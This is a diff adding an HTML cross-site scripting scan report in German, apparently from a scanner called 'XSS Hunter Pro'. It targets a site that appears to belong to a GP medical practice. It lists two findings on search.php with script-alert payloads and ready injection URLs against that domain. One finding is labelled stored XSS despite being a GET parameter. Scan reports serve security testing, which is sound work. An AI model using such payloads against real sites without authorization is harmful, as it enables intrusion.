@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Hunter Pro - Scan Report</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        h1, h2 { color: #2c3e50; }
+        .vulnerability { border: 1px solid #ddd; padding: 10px; margin-bottom: 10px; border-radius: 5px; }
+        .high { border-left: 5px solid #e74c3c; }
+        .medium { border-left: 5px solid #f39c12; }
+        .low { border-left: 5px solid #3498db; }
+        .details { margin-left: 20px; }
+        pre { background-color: #f8f9fa; padding: 10px; border-radius: 5px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h1>XSS Hunter Pro - Scan Report</h1>
+    <p><strong>Datum:</strong> 2025-03-31 07:47:42</p>
+    <p><strong>Ziel:</strong> https://hausarztpraxis-mehner.de</p>
+    <p><strong>Scan-Tiefe:</strong> 2</p>
+    <p><strong>Gefundene Schwachstellen:</strong> 2</p>
+    
+    <h2>Schwachstellen</h2>
+
+    <div class="vulnerability medium">
+        <h3>1. STORED_XSS</h3>
+        <div class="details">
+            <p><strong>URL:</strong> https://hausarztpraxis-mehner.de/search.php</p>
+            <p><strong>Parameter:</strong> q70</p>
+            <p><strong>Methode:</strong> GET</p>
+            <p><strong>Payload:</strong> <pre><script>alert('lAP7xdhob4um')</script></pre></p>
+            <p><strong>Debug-URL:</strong> <a href="https://hausarztpraxis-mehner.de/search.php?q70=%3Cscript%3Ealert%28%27lAP7xdhob4um%27%29%3C/script%3E" target="_blank">https://hausarztpraxis-mehner.de/search.php?q70=%3Cscript%3Ealert%28%27lAP7xdhob4um%27%29%3C/script%3E</a></p>
+            <p><strong>Screenshot:</strong> <a href="./dom_xss/screenshots/xss_20250331_074740_lAP7xdhob4um.png">xss_20250331_074740_lAP7xdhob4um.png</a></p>
+        </div>
+    </div>
+
+    <div class="vulnerability low">
+        <h3>2. REFLECTED_XSS</h3>
+        <div class="details">
+            <p><strong>URL:</strong> https://hausarztpraxis-mehner.de/search.php</p>
+            <p><strong>Parameter:</strong> q140</p>
+            <p><strong>Methode:</strong> GET</p>
+            <p><strong>Payload:</strong> <pre><script>alert('q8nVQ6GIJf2j')</script></pre></p>
+            <p><strong>Debug-URL:</strong> <a href="https://hausarztpraxis-mehner.de/search.php?q140=%3Cscript%3Ealert%28%27q8nVQ6GIJf2j%27%29%3C/script%3E" target="_blank">https://hausarztpraxis-mehner.de/search.php?q140=%3Cscript%3Ealert%28%27q8nVQ6GIJf2j%27%29%3C/script%3E</a></p>
+            <p><strong>Screenshot:</strong> <a href="./dom_xss/screenshots/xss_20250331_074740_q8nVQ6GIJf2j.png">xss_20250331_074740_q8nVQ6GIJf2j.png</a></p>
+        </div>
+    </div>
+
+</body>
+</html>
